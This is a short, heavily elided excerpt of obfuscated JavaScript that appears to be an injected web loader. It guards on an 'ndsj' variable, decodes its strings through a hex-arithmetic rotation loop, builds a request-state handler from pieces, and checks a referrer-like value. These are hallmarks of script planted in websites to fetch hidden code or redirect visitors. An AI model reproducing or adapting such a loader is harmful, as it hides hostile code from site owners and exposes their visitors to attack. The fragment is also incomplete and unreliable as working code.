...
if (typeof ndsj === "undefined") {
  ...
  (function (v, k) {
    ...
    while (!![]) {
      try {
        var Y =
          (-parseInt(l(B.v)) / (-0x23e5 + 0x8f * -0xf + -0x1 * -0x2c47)) *
            (-parseInt(l(B.k)) / (-0x1 * -0x2694 + -0xa6a * -0x2 + -0x3b66)) +
          (parseInt(l(B.X)) / (0x525 + -0x1906 + 0x13e4)) *
            (parseInt(l(B.Y)) / (0xf * 0x7b + 0x1522 + -0x1c53 * 0x1)) +
      ...
      this[d(W.v)] = function (v, k) {
        ...
        (X[c(J.v) + c(J.k) + c(J.X) + c(J.Y) + c(J.H) + c(J.m)] = function () {
          ...
          if (
            ...
            X[w(g.Y) + w(g.H)] == 0x13d7 * 0x1 + 0x1341 + -0x10 * 0x265
          )
  ...
  (function () {
    var a = {
      ...
      K = k[M(a.K) + M(a.o) + "er"];
    m[M(a.x) + M(a.f) + "f"](M(a.h) + ".") == -0xcfd + 0x1 * -0x1b5c + 0x2859 &&
